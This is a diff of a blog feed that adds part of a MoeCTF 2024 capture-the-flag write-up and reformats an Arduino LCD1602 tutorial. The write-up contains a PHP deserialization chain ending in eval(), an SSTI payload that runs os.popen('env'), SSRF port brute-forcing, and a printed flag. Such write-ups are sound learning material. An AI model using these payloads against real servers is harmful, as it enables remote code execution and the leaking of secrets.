+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$payl0ad</span> = <span class="string">&#x27;0&#x27;</span>;<span class="comment">//跳过if</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();<span class="comment">//要调用class001的invoke方法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __destruct()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;check();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function check()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if($this-&gt;payl0ad === 0)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         die(&#x27;FAILED TO ATTACK&#x27;);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     $a = $this-&gt;what;</span></span><br><span class="line">    <span class="comment">//     $a();//此时会调用class001的invoke方法</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span> = <span class="string">&#x27;dangerous&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class002</span>();</span><br><span class="line">    <span class="comment">// public function __invoke()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;a-&gt;payload = $this-&gt;payl0ad;//把dangerous赋给class002的payload变量，相当于设置变量，会调用set方法</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sec</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class003</span>();</span><br><span class="line">    <span class="comment">// public function __set($a, $b)//值是dangerous</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;$b($this-&gt;sec);//把b设置成dangerous，sec为new class003()返回mystr</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function dangerous($whaattt)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $whaattt-&gt;evvval($this-&gt;sec);//$whaattt设置为class003，sec设置为new class003()，whaatt设置需要执行dangerous方法</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;<span class="comment">//设置mystr为要执行rce的命令</span></span><br><span class="line">    <span class="comment">// public function evvval($str)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     eval($str);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __tostring()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     return $this-&gt;mystr;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">class000</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;data&#x27;]))</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     $a = unserialize($_GET[&#x27;data&#x27;]);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// else &#123;</span></span><br><span class="line"><span class="comment">//     highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure></div>
+<p>实测这样不行，要调用<code>__construct</code>方法，呜呜呜，修改一下</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span>  <span class="variable">$payl0ad</span>;</span><br><span class="line">	<span class="keyword">public</span>  <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;payl0ad = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;what = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$payl0ad</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;payl0ad = <span class="string">&#x27;dangerous&#x27;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">class002</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sec</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sec = <span class="keyword">new</span> <span class="title function_ invoke__">class003</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;mystr = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">class000</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>得到输出</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;class000&quot;:2:&#123;s:7:&quot;payl0ad&quot;;s:1:&quot;0&quot;;s:4:&quot;what&quot;;O:8:&quot;class001&quot;:2:&#123;s:7:&quot;payl0ad&quot;;s:9:&quot;dangerous&quot;;s:1:&quot;a&quot;;O:8:&quot;class002&quot;:1:&#123;s:3:&quot;sec&quot;;O:8:&quot;class003&quot;:1:&#123;s:5:&quot;mystr&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>通过get发送即可，在页面搜索flag即可找到。</p>
+<h4 id="217-whos-blog"><a class="markdownIt-Anchor" href="#217-whos-blog"></a> 2.17 Who’s blog?</h4>
+<p>ssti注入，使用hackbar内置的注入模板即可得到flag</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<h4 id="218-勇闯铜人阵"><a class="markdownIt-Anchor" href="#218-勇闯铜人阵"></a> 2.18 勇闯铜人阵</h4>
+<p>写脚本题（好难呜呜）gpt帮我，抓包发现点击回答按钮后会发送post请求，服务器随机返回1到2个数字，在3秒内拼接字符串直接通过post发送即可</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:55165/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化session对象</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方位数据</span></span><br><span class="line">directions_single = [<span class="string">&quot;北方&quot;</span>, <span class="string">&quot;东北方&quot;</span>, <span class="string">&quot;东方&quot;</span>, <span class="string">&quot;东南方&quot;</span>, <span class="string">&quot;南方&quot;</span>, <span class="string">&quot;西南方&quot;</span>, <span class="string">&quot;西方&quot;</span>, <span class="string">&quot;西北方&quot;</span>]</span><br><span class="line">directions_double = [<span class="string">f&quot;<span class="subst">&#123;d&#125;</span>一个&quot;</span> <span class="keyword">for</span> d <span class="keyword">in</span> directions_single]</span><br><span class="line">prompts = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始数据</span></span><br><span class="line">data_init = &#123;</span><br><span class="line">    <span class="string">&#x27;player&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;direct&#x27;</span>: <span class="string">&#x27;弟子明白&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 发送初始POST请求</span></span><br><span class="line">    response = session.post(url, data=data_init)</span><br><span class="line">    response.raise_for_status()  <span class="comment"># 检查请求是否成功</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重复过程5次</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="comment"># 提取消息中的最后8个字符作为提示</span></span><br><span class="line">        msg = response.text[-<span class="number">30</span>:-<span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分析提示</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> prompts:</span><br><span class="line">                num += <span class="number">1</span></span><br><span class="line">                string += char</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 根据提示数量构建新的请求数据</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">            index = <span class="built_in">int</span>(string) - <span class="number">1</span></span><br><span class="line">            direction_data = &#123;</span><br><span class="line">                <span class="string">&#x27;player&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">&#x27;direct&#x27;</span>: directions_single[index]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Sending: <span class="subst">&#123;directions_single[index]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> num == <span class="number">2</span>:</span><br><span class="line">            index1, index2 = <span class="built_in">int</span>(string[<span class="number">0</span>]) - <span class="number">1</span>, <span class="built_in">int</span>(string[<span class="number">1</span>]) - <span class="number">1</span></span><br><span class="line">            direction_data = &#123;</span><br><span class="line">                <span class="string">&#x27;player&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">&#x27;direct&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;directions_double[index1]&#125;</span>，<span class="subst">&#123;directions_double[index2]&#125;</span>&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Sending: <span class="subst">&#123;directions_double[index1]&#125;</span>，<span class="subst">&#123;directions_double[index2]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unexpected number of prompts: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(num))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送新请求</span></span><br><span class="line">        response = session.post(url, data=direction_data)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<h4 id="219-imagecloud"><a class="markdownIt-Anchor" href="#219-imagecloud"></a> 2.19 ImageCloud</h4>
+<p>审计代码，发现点击上传图片之后会自动生成一个5000端口的url和一个端口在（5001，6000）随机的url，利用burpSuite进行爆破，发现5039端口响应长度不同，将端口号改为5039，在<code>http://127.0.0.1:49265/image?url=http://localhost:5039/image/flag.jpg</code>下发现flag图片（还要OCR，不能直接复制呜呜呜）</p>
+<p>flag：moectf{CeTTebRaT3-YoU_4tt@CK-to_mY-tMAGE-Ct0UDHHHhhh355}</p>
+<h3 id="3-安全杂项"><a class="markdownIt-Anchor" href="#3-安全杂项"></a> 3. 安全杂项</h3>
+<h4 id="31-杂项入门指北"><a class="markdownIt-Anchor" href="#31-杂项入门指北"></a> 3.1 杂项入门指北</h4>
+<p>观察海报右侧发现摩尔斯密码，在线解密后得到flag，使用<code>moectf&#123;&#125;</code>包裹提交即可</p>
+<h4 id="32-signin"><a class="markdownIt-Anchor" href="#32-signin"></a> 3.2 signin</h4>
+<p>按照提示签到即可</p>
+<h4 id="33-罗小黑战记"><a class="markdownIt-Anchor" href="#33-罗小黑战记"></a> 3.3 罗小黑战记</h4>
+<p>拆分gif为帧图片，出现二维码，扫码即可获得flag</p>
+<h4 id="34-ez_f5"><a class="markdownIt-Anchor" href="#34-ez_f5"></a> 3.4 ez_F5</h4>
+<p>按照题目提示使用F5隐写软件解码即可<a class="link"   href="https://github.com/matthewgao/F5-steganography" >repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，注意要使用java8，高版本的jdk会报错，密码见图片文件属性，使用base32解码即可得到</p>
+<p><code>java Extract &lt;file&gt; -p no_password</code>在output.txt发现flag</p>
 ]]></content>
   </entry>
   <entry>
@@ -233,9 +589,10 @@
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://resources.starsac.cn/2024/10/lcd1602%20(3).png"
-                      alt="lcd1602"
+                      alt="lcd1602" 
                 ></p>
-<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>LCD1602是一种16列2行的液晶显示屏, 可以显示数字, 拉丁字母和少量符号. 原版1602显示屏使用并行数据传输, 有8个数据引脚. 可通过增加PCF8574芯片使其支持IIC总线. 支持IIC总线的1602显示屏有四个引脚:</p>
+<h2 id="1前言"><a class="markdownIt-Anchor" href="#1前言"></a> 1.前言</h2>
+<p>LCD1602是一种16列2行的液晶显示屏, 可以显示数字, 拉丁字母和少量符号. 原版1602显示屏使用并行数据传输, 有8个数据引脚. 可通过增加PCF8574芯片使其支持IIC总线. 支持IIC总线的1602显示屏有四个引脚:</p>
 <table>
 <thead>
 <tr>
@@ -246,40 +603,46 @@
 <th>SCL</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>对应连接的Arduino引脚</td>
 <td>5V</td>
 <td>GND</td>
 <td>SDA</td>
 <td>SCL</td>
 </tr>
-</tbody></table>
-<p>通过<code>LiquidCrystal_I2C</code>库, 我们可以很方便地通过IIC总线驱动LCD1602显示屏. </p>
-<h2 id="2-安装LiquidCrystal-I2C库"><a href="#2-安装LiquidCrystal-I2C库" class="headerlink" title="2.安装LiquidCrystal_I2C库"></a>2.安装<code>LiquidCrystal_I2C</code>库</h2><p>新版Arduino IDE提供了库管理器, 可以很方便地在左侧边栏的库管理搜索并添加<code>LiquidCrystal_I2C</code>库.</p>
+</tbody>
+</table>
+<p>通过<code>LiquidCrystal_I2C</code>库, 我们可以很方便地通过IIC总线驱动LCD1602显示屏.</p>
+<h2 id="2安装liquidcrystal_i2c库"><a class="markdownIt-Anchor" href="#2安装liquidcrystal_i2c库"></a> 2.安装<code>LiquidCrystal_I2C</code>库</h2>
+<p>新版Arduino IDE提供了库管理器, 可以很方便地在左侧边栏的库管理搜索并添加<code>LiquidCrystal_I2C</code>库.</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://resources.starsac.cn/2024/10/lcd1602%20(1).png"
-                      alt="添加库文件"
+                      alt="添加库文件" 
                 ></p>
 <p>也可以通过<a class="link"   href="https://github.com/johnrickman/LiquidCrystal_I2C" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>页面下载<code>.zip</code>文件导入Arduino IDE进行安装.</p>
-<h2 id="3-连接硬件"><a href="#3-连接硬件" class="headerlink" title="3.连接硬件"></a>3.连接硬件</h2><p>按照表格依次将四根导线连接到Arduino开发板上.</p>
+<h2 id="3连接硬件"><a class="markdownIt-Anchor" href="#3连接硬件"></a> 3.连接硬件</h2>
+<p>按照表格依次将四根导线连接到Arduino开发板上.</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://resources.starsac.cn/2024/10/lcd1602%20(2).png"
-                      alt="连线图"
+                      alt="连线图" 
                 ></p>
-<h2 id="4-编写程序使用Arduino库"><a href="#4-编写程序使用Arduino库" class="headerlink" title="4.编写程序使用Arduino库"></a>4.编写程序使用Arduino库</h2><h4 id="41-包含库文件-创建对象"><a href="#41-包含库文件-创建对象" class="headerlink" title="41.包含库文件, 创建对象"></a>41.包含库文件, 创建对象</h4><p>在程序源代码开头, 我们需要包含<code>LiquidCrystal_I2C</code>库, 并且创建LCD对象.</p>
+<h2 id="4编写程序使用arduino库"><a class="markdownIt-Anchor" href="#4编写程序使用arduino库"></a> 4.编写程序使用Arduino库</h2>
+<h4 id="41包含库文件-创建对象"><a class="markdownIt-Anchor" href="#41包含库文件-创建对象"></a> 41.包含库文件, 创建对象</h4>
+<p>在程序源代码开头, 我们需要包含<code>LiquidCrystal_I2C</code>库, 并且创建LCD对象.</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;LiquidCrystal_I2C.h&gt;</span></span></span><br><span class="line"><span class="comment">// 这里设置LCD地址为0x27, 有16列, 2行</span></span><br><span class="line">LiquidCrystal_I2C <span class="title function_">mylcd</span><span class="params">(<span class="number">0x27</span>, <span class="number">16</span>, <span class="number">2</span>)</span>;  </span><br></pre></td></tr></table></figure></div>
-
-<h4 id="42-void-setup-函数"><a href="#42-void-setup-函数" class="headerlink" title="42.void setup()函数"></a>42.<code>void setup()</code>函数</h4><p>在<code>setup()</code>函数部分, 我们可以进行初始化, 开启背光等操作. </p>
+<h4 id="42void-setup函数"><a class="markdownIt-Anchor" href="#42void-setup函数"></a> 42.<code>void setup()</code>函数</h4>
+<p>在<code>setup()</code>函数部分, 我们可以进行初始化, 开启背光等操作.</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span>&#123;</span><br><span class="line">    mylcd.init();		<span class="comment">// 初始化LCD</span></span><br><span class="line">    mylcd.backlight();	<span class="comment">// 打开背光</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="43-void-loop-函数"><a href="#43-void-loop-函数" class="headerlink" title="43.void loop()函数"></a>43.<code>void loop()</code>函数</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span>&#123;</span><br><span class="line">    mylcd.setCursor(<span class="number">0</span>,<span class="number">0</span>);			<span class="comment">// 设置光标位置</span></span><br><span class="line">    mylcd.print(<span class="string">&quot;Hello World!&quot;</span>);	<span class="comment">// 打印文字</span></span><br><span class="line">    mylcd.print(analogRead(A0));	<span class="comment">// 输出变量的值</span></span><br><span class="line">  	mylcd.setCursor(<span class="number">4</span>,<span class="number">1</span>);			<span class="comment">// 可以任意设置光标的位置</span></span><br><span class="line">  	mylcd.print(<span class="string">&quot;by StarsAC&quot;</span>);</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">    mylcd.clear();					<span class="comment">// 清除显示内容</span></span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="5-其他示例程序"><a href="#5-其他示例程序" class="headerlink" title="5.其他示例程序"></a>5.其他示例程序</h2><h4 id="51-使屏幕显示从串口发来的内容"><a href="#51-使屏幕显示从串口发来的内容" class="headerlink" title="51.使屏幕显示从串口发来的内容"></a>51.使屏幕显示从串口发来的内容</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Wire.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;LiquidCrystal_I2C.h&gt;</span></span></span><br><span class="line">LiquidCrystal_I2C <span class="title function_">mylcd</span><span class="params">(<span class="number">0x27</span>,<span class="number">16</span>,<span class="number">2</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span>&#123;</span><br><span class="line">  mylcd.init();</span><br><span class="line">  mylcd.backlight();</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);	<span class="comment">// 打开串口通讯, 设置波特率为9600</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Serial.available())&#123;	<span class="comment">// 当有数据从串口发来时</span></span><br><span class="line">    delay(<span class="number">100</span>);</span><br><span class="line">    mylcd.clear();</span><br><span class="line">    <span class="keyword">while</span> (Serial.available() &gt; <span class="number">0</span>)&#123;	<span class="comment">// 通过while循环读取所有串口数据</span></span><br><span class="line">      mylcd.write(Serial.read());		<span class="comment">// 将每个字符显示至LCD屏幕</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
+<h4 id="43void-loop函数"><a class="markdownIt-Anchor" href="#43void-loop函数"></a> 43.<code>void loop()</code>函数</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span>&#123;</span><br><span class="line">    mylcd.setCursor(<span class="number">0</span>,<span class="number">0</span>);			<span class="comment">// 设置光标位置</span></span><br><span class="line">    mylcd.print(<span class="string">&quot;Hello World!&quot;</span>);	<span class="comment">// 打印文字</span></span><br><span class="line">    mylcd.print(analogRead(A0));	<span class="comment">// 输出变量的值</span></span><br><span class="line">  	mylcd.setCursor(<span class="number">4</span>,<span class="number">1</span>);			<span class="comment">// 可以任意设置光标的位置</span></span><br><span class="line">  	mylcd.print(<span class="string">&quot;by StarsAC&quot;</span>);</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">    mylcd.clear();					<span class="comment">// 清除显示内容</span></span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="5其他示例程序"><a class="markdownIt-Anchor" href="#5其他示例程序"></a> 5.其他示例程序</h2>
+<h4 id="51使屏幕显示从串口发来的内容"><a class="markdownIt-Anchor" href="#51使屏幕显示从串口发来的内容"></a> 51.使屏幕显示从串口发来的内容</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Wire.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;LiquidCrystal_I2C.h&gt;</span></span></span><br><span class="line">LiquidCrystal_I2C <span class="title function_">mylcd</span><span class="params">(<span class="number">0x27</span>,<span class="number">16</span>,<span class="number">2</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span>&#123;</span><br><span class="line">  mylcd.init();</span><br><span class="line">  mylcd.backlight();</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);	<span class="comment">// 打开串口通讯, 设置波特率为9600</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Serial.available())&#123;	<span class="comment">// 当有数据从串口发来时</span></span><br><span class="line">    delay(<span class="number">100</span>);</span><br><span class="line">    mylcd.clear();</span><br><span class="line">    <span class="keyword">while</span> (Serial.available() &gt; <span class="number">0</span>)&#123;	<span class="comment">// 通过while循环读取所有串口数据</span></span><br><span class="line">      mylcd.write(Serial.read());		<span class="comment">// 将每个字符显示至LCD屏幕</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 ]]></content>
       <categories>
         <category>Hardware</category>
@@ -289,75 +652,5 @@
         <tag>Hardware</tag>
         <tag>Arduino</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>MoeCTF 2024 解题小记（WP）</title>
-    <url>/2024/10/21/MoeCTF-2024-%E8%A7%A3%E9%A2%98%E5%B0%8F%E8%AE%B0%EF%BC%88WP%EF%BC%89/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://resources.starsac.cn/2024/10/moectf2024.webp"
-                      alt="moectf2024"
-                ></p>
-<h3 id="0-总结的一些做题思路"><a href="#0-总结的一些做题思路" class="headerlink" title="0. 总结的一些做题思路"></a>0. 总结的一些做题思路</h3><p>工具：BurpSuite，WRSX（西电CTF用），AntSword，御剑扫描工具，HackBar</p>
-<p>index.phps查看php源码</p>
-<p>字符串能和0弱比较相等</p>
-<p>查看php相关信息可以用<code>phpinfo();</code></p>
-<h3 id="1-0基础入门"><a href="#1-0基础入门" class="headerlink" title="1. 0基础入门"></a>1. 0基础入门</h3><h4 id="1-1-在此签到"><a href="#1-1-在此签到" class="headerlink" title="1.1 在此签到"></a>1.1 在此签到</h4><p>在QQ群绑定账号即可获得flag。</p>
-<h3 id="2-Web渗透测试与审计"><a href="#2-Web渗透测试与审计" class="headerlink" title="2. Web渗透测试与审计"></a>2. Web渗透测试与审计</h3><h4 id="2-1-Web渗透测试与审计入门指北"><a href="#2-1-Web渗透测试与审计入门指北" class="headerlink" title="2.1 Web渗透测试与审计入门指北"></a>2.1 Web渗透测试与审计入门指北</h4><p>在vm虚拟机中安装任意Linux发行版，安装宝塔面板部署网站，将题中附件放入网站目录，使用浏览器打开即可获得flag。</p>
-<h4 id="2-2-弗拉格之地的入口"><a href="#2-2-弗拉格之地的入口" class="headerlink" title="2.2 弗拉格之地的入口"></a>2.2 弗拉格之地的入口</h4><p>根据题目信息打开爬虫协议<code>/robot.txt</code>文件</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Robots.txt file for xdsec.org</span><br><span class="line"># only robots can find the entrance of web-tutor</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /webtutorEntry.php</span><br></pre></td></tr></table></figure></div>
-
-<p>再打开<code>/webtutorEntry.php</code>即可看到flag。</p>
-<h4 id="2-3-垫刀之路01"><a href="#2-3-垫刀之路01" class="headerlink" title="2.3 垫刀之路01"></a>2.3 垫刀之路01</h4><p>输入<code>ls /</code>查看根目录下文件，发现<code>flag</code>和<code>flag.sh</code>。赶紧点开看看，使用cat命令查看后，好家伙被骗了，但是得到提示：看看环境变量。输入env命令查看环境变量即可得到flag。</p>
-<h4 id="2-4-ez-http"><a href="#2-4-ez-http" class="headerlink" title="2.4 ez_http"></a>2.4 ez_http</h4><p>按要求使用post和get提交参数，出现提示source must be….，修改请求头referer信息，记得放到host之后，出现提示setcookie，在Connection下面设置cookie即可。提示使用MoeDedicatedBrowser，把UserAgent设成这个就行。提示Local Access Only，改xff为127.0.0.1，之后就能得到flag了！！！</p>
-<h4 id="2-5-ProveYourLove"><a href="#2-5-ProveYourLove" class="headerlink" title="2.5 ProveYourLove"></a>2.5 ProveYourLove</h4><p>笨方法，用代理拦截一次发出n多请求，点的我手疼hhh</p>
